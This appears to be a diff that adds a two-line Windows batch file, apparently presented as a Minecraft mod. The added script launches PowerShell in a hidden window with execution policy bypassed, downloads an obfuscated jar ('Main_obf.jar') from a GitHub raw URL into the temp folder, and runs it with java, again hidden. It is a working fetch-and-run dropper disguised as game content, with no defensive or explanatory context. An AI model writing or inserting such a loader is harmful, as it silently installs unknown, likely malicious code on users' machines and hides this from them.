@@ -1,0 +1,2 @@
+@echo off
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/edhjsertwasfvds/ModMinecraftJar1.2.8/main/Main_obf.jar' -OutFile '%TEMP%\Main_obf.jar' -UseBasicParsing; Start-Process -FilePath 'java' -ArgumentList '-jar','%TEMP%\Main_obf.jar' -WindowStyle Hidden"
